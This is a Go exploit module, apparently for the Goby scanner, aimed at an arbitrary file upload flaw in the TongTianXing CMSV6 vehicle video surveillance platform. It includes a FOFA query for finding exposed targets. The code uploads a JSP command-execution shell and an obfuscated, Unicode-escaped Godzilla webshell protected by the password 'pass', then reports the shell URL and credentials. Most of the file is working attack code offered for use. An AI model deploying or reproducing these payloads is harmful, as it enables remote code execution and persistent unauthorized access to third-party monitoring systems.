package exploits

import (
	"fmt"
	"regexp"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "TongTianXing CMSV6 /inspect_file/upload File Upload Vulnerability",
    "Description": "<p>Tongtianxing CMSV6 vehicle video surveillance platform is a monitoring platform developed by Dongguan Tongtianxing Software Technology Co., Ltd., Tongtianxing CMSV6 products cover the video integrated platform of vehicle video recorders, individual video recorders, network surveillance cameras, tachographs and other products.</p><p>There is an arbitrary file upload vulnerability in the upload interface of Tongtianxing CMS system, which allows an attacker to upload malicious files on the affected system, and the potential risks include remote execution of malicious code, access to sensitive data, and other dangerous operations. Attackers can abuse the system by uploading malicious files.</p>",
    "Product": "TongTianxing CMSV6",
    "Homepage": "http://www.g-sky.cn/",
    "DisclosureDate": "2024-03-29",
    "PostTime": "2024-04-02",
    "Author": "兰公子",
    "FofaQuery": "body=\"808gps\"",
    "GobyQuery": "body=\"808gps\"",
    "Level": "3",
    "Impact": "<p>There is an arbitrary file upload vulnerability in the upload interface of Tongtianxing CMS system, which allows an attacker to upload malicious files on the affected system, and the potential risks include remote execution of malicious code, access to sensitive data, and other dangerous operations. Attackers can abuse the system by uploading malicious files.</p>",
    "Recommendation": "<p>The latest version has been released: <a href=\"http://www.g-sky.cn/\">http://www.g-sky.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "choose",
            "type": "select",
            "value": "command,upload_default,customize",
            "show": ""
        },
        {
            "name": "command",
            "type": "input",
            "value": "whoami",
            "show": "choose=command"
        },
        {
            "name": "customize",
            "type": "input",
            "value": "Please Customize File Content.",
            "show": "choose=customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/inspect_file/upload",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=---------------------------7db372eb000e2"
                },
                "data_type": "text",
                "data": "-----------------------------7db372eb000e2\r\nContent-Disposition: form-data;name=\"uploadFile\";filename=\"1.jsp\"\r\nContent-Type:application/octet-stream\r\n\r\n<% out.println(\"test\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r\n\r\n-----------------------------7db372eb000e2--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "path|lastbody|regex|(?:\"filePath\":\")([\\s\\S]*)(?:\",\"fileType\")",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/inspect_file/upload"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "{{{path}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "通天星 CMSV6 /inspect_file/upload 文件上传漏洞",
            "Product": "通天星 CMSV6",
            "Description": "<p>通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。<br></p><p>通天星CMS系统 upload 接口存在任意文件上传漏洞，该漏洞使得攻击者可以在受影响的系统上上传恶意文件，潜在风险包括远程执行恶意代码、访问敏感数据，以及其他危险操作。攻击者可以通过上传恶意文件来滥用系统。<br></p>",
            "Recommendation": "<p>厂商已发布最新版本：<a href=\"http://www.g-sky.cn/\" target=\"_blank\">http://www.g-sky.cn/</a><br></p>",
            "Impact": "<p>通天星CMS系统 upload 接口存在任意文件上传漏洞，该漏洞使得攻击者可以在受影响的系统上上传恶意文件，潜在风险包括远程执行恶意代码、访问敏感数据，以及其他危险操作。攻击者可以通过上传恶意文件来滥用系统。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "TongTianXing CMSV6 /inspect_file/upload File Upload Vulnerability",
            "Product": "TongTianxing CMSV6",
            "Description": "<p>Tongtianxing CMSV6 vehicle video surveillance platform is a monitoring platform developed by Dongguan Tongtianxing Software Technology Co., Ltd., Tongtianxing CMSV6 products cover the video integrated platform of vehicle video recorders, individual video recorders, network surveillance cameras, tachographs and other products.</p><p>There is an arbitrary file upload vulnerability in the upload interface of Tongtianxing CMS system, which allows an attacker to upload malicious files on the affected system, and the potential risks include remote execution of malicious code, access to sensitive data, and other dangerous operations. Attackers can abuse the system by uploading malicious files.</p>",
            "Recommendation": "<p>The latest version has been released: <a href=\"http://www.g-sky.cn/\" target=\"_blank\">http://www.g-sky.cn/</a><br></p>",
            "Impact": "<p>There is an arbitrary file upload vulnerability in the upload interface of Tongtianxing CMS system, which allows an attacker to upload malicious files on the affected system, and the potential risks include remote execution of malicious code, access to sensitive data, and other dangerous operations. Attackers can abuse the system by uploading malicious files.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10940"
}`

	// 正则匹配(输入：表达式 , 内容)
	makeRegularasfDD := func(RegularContent string, RegularUrl string) (string, error) {
		reRequestasfDD := regexp.MustCompile(RegularUrl)
		if !reRequestasfDD.MatchString(RegularContent) {
			return "", fmt.Errorf("can't match value")
		}
		getname := reRequestasfDD.FindStringSubmatch(RegularContent)
		return getname[1], nil
	}

	//GET请求构造(请求url)
	sendPayloadFlagGetGHsaf := func(hostInfo *httpclient.FixUrl, urlOfGet string, getHeaderMap map[string]string) (*httpclient.HttpResponse, error) {
		getRequestConfigGHsaf := httpclient.NewGetRequestConfig(urlOfGet)
		getRequestConfigGHsaf.VerifyTls = false
		getRequestConfigGHsaf.FollowRedirect = false
		for postHeaderKey, postHeaderValue := range getHeaderMap {
			getRequestConfigGHsaf.Header.Store(postHeaderKey, postHeaderValue)
		}
		return httpclient.DoHttpRequest(hostInfo, getRequestConfigGHsaf)
	}

	// POST请求构造(请求url , data参数 , header参数(map))
	sendPayloadFlagPostasfDD := func(hostInfo *httpclient.FixUrl, urlOfPost string, dataOfPost string, postHeaderMap map[string]string) (*httpclient.HttpResponse, error) {
		postRequestConfigasfDD := httpclient.NewPostRequestConfig(urlOfPost)
		postRequestConfigasfDD.VerifyTls = false
		postRequestConfigasfDD.FollowRedirect = false
		for postHeaderKey, postHeaderValue := range postHeaderMap {
			postRequestConfigasfDD.Header.Store(postHeaderKey, postHeaderValue)
		}
		postRequestConfigasfDD.Data = dataOfPost
		return httpclient.DoHttpRequest(hostInfo, postRequestConfigasfDD)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var commondtxt string
			var finishcommand string
			choose := goutils.B2S(ss.Params["choose"])

			if choose == "command" {
				commondtxt = goutils.B2S(ss.Params["command"])
				finishcommand = `<%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(c);java.util.Scanner s=new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");String o=s.hasNext()?s.next():"";out.println(o);String f=application.getRealPath(request.getServletPath());java.io.File x=new java.io.File(f);x.delete();}%>`
			} else if choose == "upload_default" {
				finishcommand = `<%! \u0053\u0074\u0072\u0069\u006e\u0067 \u0078\u0063="\u0033\u0063\u0036\u0065\u0030\u0062\u0038\u0061\u0039\u0063\u0031\u0035\u0032\u0032\u0034\u0061"; \u0053\u0074\u0072\u0069\u006e\u0067 \u0070\u0061\u0073\u0073="\u0070\u0061\u0073\u0073"; \u0053\u0074\u0072\u0069\u006e\u0067 \u006d\u0064\u0035=\u006d\u0064\u0035(\u0070\u0061\u0073\u0073+\u0078\u0063); \u0063\u006c\u0061\u0073\u0073 \u0058 \u0065\u0078\u0074\u0065\u006e\u0064\u0073 \u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072{\u0070\u0075\u0062\u006c\u0069\u0063 \u0058(\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 \u007a){\u0073\u0075\u0070\u0065\u0072(\u007a);}\u0070\u0075\u0062\u006c\u0069\u0063 \u0043\u006c\u0061\u0073\u0073 \u0051(\u0062\u0079\u0074\u0065[] \u0063\u0062){\u0072\u0065\u0074\u0075\u0072\u006e \u0073\u0075\u0070\u0065\u0072.\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073(\u0063\u0062, \u0030, \u0063\u0062.\u006c\u0065\u006e\u0067\u0074\u0068);} }\u0070\u0075\u0062\u006c\u0069\u0063 \u0062\u0079\u0074\u0065[] \u0078(\u0062\u0079\u0074\u0065[] \u0073,\u0062\u006f\u006f\u006c\u0065\u0061\u006e \u006d){ \u0074\u0072\u0079{\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0043\u0069\u0070\u0068\u0065\u0072 \u0063=\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0043\u0069\u0070\u0068\u0065\u0072.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("\u0041\u0045\u0053");\u0063.\u0069\u006e\u0069\u0074(\u006d?\u0031:\u0032,\u006e\u0065\u0077 \u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0073\u0070\u0065\u0063.\u0053\u0065\u0063\u0072\u0065\u0074\u004b\u0065\u0079\u0053\u0070\u0065\u0063(\u0078\u0063.\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073(),"\u0041\u0045\u0053"));\u0072\u0065\u0074\u0075\u0072\u006e \u0063.\u0064\u006f\u0046\u0069\u006e\u0061\u006c(\u0073); }\u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065){\u0072\u0065\u0074\u0075\u0072\u006e \u006e\u0075\u006c\u006c; }} \u0070\u0075\u0062\u006c\u0069\u0063 \u0073\u0074\u0061\u0074\u0069\u0063 \u0053\u0074\u0072\u0069\u006e\u0067 \u006d\u0064\u0035(\u0053\u0074\u0072\u0069\u006e\u0067 \u0073) {\u0053\u0074\u0072\u0069\u006e\u0067 \u0072\u0065\u0074 = \u006e\u0075\u006c\u006c;\u0074\u0072\u0079 {\u006a\u0061\u0076\u0061.\u0073\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u004d\u0065\u0073\u0073\u0061\u0067\u0065\u0044\u0069\u0067\u0065\u0073\u0074 \u006d;\u006d = \u006a\u0061\u0076\u0061.\u0073\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u004d\u0065\u0073\u0073\u0061\u0067\u0065\u0044\u0069\u0067\u0065\u0073\u0074.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("\u004d\u0044\u0035");\u006d.\u0075\u0070\u0064\u0061\u0074\u0065(\u0073.\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073(), \u0030, \u0073.\u006c\u0065\u006e\u0067\u0074\u0068());\u0072\u0065\u0074 = \u006e\u0065\u0077 \u006a\u0061\u0076\u0061.\u006d\u0061\u0074\u0068.\u0042\u0069\u0067\u0049\u006e\u0074\u0065\u0067\u0065\u0072(\u0031, \u006d.\u0064\u0069\u0067\u0065\u0073\u0074()).\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067(\u0031\u0036).\u0074\u006f\u0055\u0070\u0070\u0065\u0072\u0043\u0061\u0073\u0065();} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065) {}\u0072\u0065\u0074\u0075\u0072\u006e \u0072\u0065\u0074; } \u0070\u0075\u0062\u006c\u0069\u0063 \u0073\u0074\u0061\u0074\u0069\u0063 \u0053\u0074\u0072\u0069\u006e\u0067 \u0062\u0061\u0073\u0065\u0036\u0034\u0045\u006e\u0063\u006f\u0064\u0065(\u0062\u0079\u0074\u0065[] \u0062\u0073) \u0074\u0068\u0072\u006f\u0077\u0073 \u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e {\u0043\u006c\u0061\u0073\u0073 \u0062\u0061\u0073\u0065\u0036\u0034;\u0053\u0074\u0072\u0069\u006e\u0067 \u0076\u0061\u006c\u0075\u0065 = \u006e\u0075\u006c\u006c;\u0074\u0072\u0079 {\u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u006a\u0061\u0076\u0061.\u0075\u0074\u0069\u006c.\u0042\u0061\u0073\u0065\u0036\u0034");\u004f\u0062\u006a\u0065\u0063\u0074 \u0045\u006e\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0067\u0065\u0074\u0045\u006e\u0063\u006f\u0064\u0065\u0072", \u006e\u0075\u006c\u006c).\u0069\u006e\u0076\u006f\u006b\u0065(\u0062\u0061\u0073\u0065\u0036\u0034, \u006e\u0075\u006c\u006c);\u0076\u0061\u006c\u0075\u0065 = (\u0053\u0074\u0072\u0069\u006e\u0067)\u0045\u006e\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0065\u006e\u0063\u006f\u0064\u0065\u0054\u006f\u0053\u0074\u0072\u0069\u006e\u0067", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0062\u0079\u0074\u0065[].\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0045\u006e\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065) {\u0074\u0072\u0079 { \u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u0073\u0075\u006e.\u006d\u0069\u0073\u0063.\u0042\u0041\u0053\u0045\u0036\u0034\u0045\u006e\u0063\u006f\u0064\u0065\u0072"); \u004f\u0062\u006a\u0065\u0063\u0074 \u0045\u006e\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065(); \u0076\u0061\u006c\u0075\u0065 = (\u0053\u0074\u0072\u0069\u006e\u0067)\u0045\u006e\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0065\u006e\u0063\u006f\u0064\u0065", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0062\u0079\u0074\u0065[].\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0045\u006e\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065\u0032) {}}\u0072\u0065\u0074\u0075\u0072\u006e \u0076\u0061\u006c\u0075\u0065; } \u0070\u0075\u0062\u006c\u0069\u0063 \u0073\u0074\u0061\u0074\u0069\u0063 \u0062\u0079\u0074\u0065[] \u0062\u0061\u0073\u0065\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065(\u0053\u0074\u0072\u0069\u006e\u0067 \u0062\u0073) \u0074\u0068\u0072\u006f\u0077\u0073 \u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e {\u0043\u006c\u0061\u0073\u0073 \u0062\u0061\u0073\u0065\u0036\u0034;\u0062\u0079\u0074\u0065[] \u0076\u0061\u006c\u0075\u0065 = \u006e\u0075\u006c\u006c;\u0074\u0072\u0079 {\u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u006a\u0061\u0076\u0061.\u0075\u0074\u0069\u006c.\u0042\u0061\u0073\u0065\u0036\u0034");\u004f\u0062\u006a\u0065\u0063\u0074 \u0064\u0065\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072", \u006e\u0075\u006c\u006c).\u0069\u006e\u0076\u006f\u006b\u0065(\u0062\u0061\u0073\u0065\u0036\u0034, \u006e\u0075\u006c\u006c);\u0076\u0061\u006c\u0075\u0065 = (\u0062\u0079\u0074\u0065[])\u0064\u0065\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0064\u0065\u0063\u006f\u0064\u0065", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0053\u0074\u0072\u0069\u006e\u0067.\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0064\u0065\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065) {\u0074\u0072\u0079 { \u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u0073\u0075\u006e.\u006d\u0069\u0073\u0063.\u0042\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072"); \u004f\u0062\u006a\u0065\u0063\u0074 \u0064\u0065\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065(); \u0076\u0061\u006c\u0075\u0065 = (\u0062\u0079\u0074\u0065[])\u0064\u0065\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0064\u0065\u0063\u006f\u0064\u0065\u0042\u0075\u0066\u0066\u0065\u0072", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0053\u0074\u0072\u0069\u006e\u0067.\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0064\u0065\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065\u0032) {}}\u0072\u0065\u0074\u0075\u0072\u006e \u0076\u0061\u006c\u0075\u0065; }%><%\u0074\u0072\u0079{\u0062\u0079\u0074\u0065[] \u0064\u0061\u0074\u0061=\u0062\u0061\u0073\u0065\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065(\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072(\u0070\u0061\u0073\u0073));\u0064\u0061\u0074\u0061=\u0078(\u0064\u0061\u0074\u0061, \u0066\u0061\u006c\u0073\u0065);\u0069\u0066 (\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0067\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0079\u006c\u006f\u0061\u0064")==\u006e\u0075\u006c\u006c){\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0079\u006c\u006f\u0061\u0064",\u006e\u0065\u0077 \u0058(\u0074\u0068\u0069\u0073.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072()).\u0051(\u0064\u0061\u0074\u0061));}\u0065\u006c\u0073\u0065{\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0073",\u0064\u0061\u0074\u0061);\u006a\u0061\u0076\u0061.\u0069\u006f.\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d \u0061\u0072\u0072\u004f\u0075\u0074=\u006e\u0065\u0077 \u006a\u0061\u0076\u0061.\u0069\u006f.\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d();\u004f\u0062\u006a\u0065\u0063\u0074 \u0066=((\u0043\u006c\u0061\u0073\u0073)\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0067\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0079\u006c\u006f\u0061\u0064")).\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065();\u0066.\u0065\u0071\u0075\u0061\u006c\u0073(\u0061\u0072\u0072\u004f\u0075\u0074);\u0066.\u0065\u0071\u0075\u0061\u006c\u0073(\u0070\u0061\u0067\u0065\u0043\u006f\u006e\u0074\u0065\u0078\u0074);\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065.\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072().\u0077\u0072\u0069\u0074\u0065(\u006d\u0064\u0035.\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006e\u0067(\u0030,\u0031\u0036));\u0066.\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067();\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065.\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072().\u0077\u0072\u0069\u0074\u0065(\u0062\u0061\u0073\u0065\u0036\u0034\u0045\u006e\u0063\u006f\u0064\u0065(\u0078(\u0061\u0072\u0072\u004f\u0075\u0074.\u0074\u006f\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079(), \u0074\u0072\u0075\u0065)));\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065.\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072().\u0077\u0072\u0069\u0074\u0065(\u006d\u0064\u0035.\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006e\u0067(\u0031\u0036));} }\u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065){}
%>`
			} else {
				finishcommand = goutils.B2S(ss.Params["customize"])
			}
			postFirstResultOfMap := map[string]string{"Content-Type": "multipart/form-data; boundary=---------------------------7db372eb000e2"}
			rsp, err := sendPayloadFlagPostasfDD(expResult.HostInfo, "/inspect_file/upload", "-----------------------------7db372eb000e2\r\nContent-Disposition: form-data;name=\"uploadFile\";filename=\"1.jsp\"\r\nContent-Type:application/octet-stream\r\n\r\n"+finishcommand+"\r\n\r\n-----------------------------7db372eb000e2--", postFirstResultOfMap)
			if err != nil {
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			if rsp.StatusCode != 200 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			pathOfThePostasfDD, err := makeRegularasfDD(rsp.Utf8Html, `"filePath":"([^"]+)"`)
			if err != nil {
				expResult.Output = "漏洞利用失败"
				return expResult
			}

			if choose == "command" {
				getSecResultOfMap := map[string]string{}
				commandResultOfGetGHsaf, err := sendPayloadFlagGetGHsaf(expResult.HostInfo, pathOfThePostasfDD+"?cmd="+commondtxt, getSecResultOfMap)
				if err != nil {
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				if commandResultOfGetGHsaf.StatusCode != 200 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output += "命令执行成功：\nresult:" + commandResultOfGetGHsaf.Utf8Html
				return expResult
			} else if choose == "upload_default" {
				getSecResultOfMap := map[string]string{}
				commandResultOfGetGHsaf, err := sendPayloadFlagGetGHsaf(expResult.HostInfo, pathOfThePostasfDD, getSecResultOfMap)
				if err != nil {
					expResult.Output = "文件上传失败"
					return expResult
				}
				if commandResultOfGetGHsaf.StatusCode != 200 {
					expResult.Success = false
					expResult.Output = "文件上传失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output += "哥斯拉WebShell URL: " + expResult.HostInfo.FixedHostInfo + pathOfThePostasfDD + "\n"
				expResult.Output += "Password: pass \n"
				expResult.Output += "加密器：JAVA_AES_BASE64 \n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n\n"
				expResult.Output += "经测试冰蝎三shell无法上传。\n冰蝎四，哥斯拉均可以正常连接shell。"
				return expResult
			} else {
				expResult.Success = true
				expResult.Output += "自定义执行成功：URL: " + expResult.HostInfo.FixedHostInfo + pathOfThePostasfDD + "\n"
				return expResult
			}
		},
	))
}
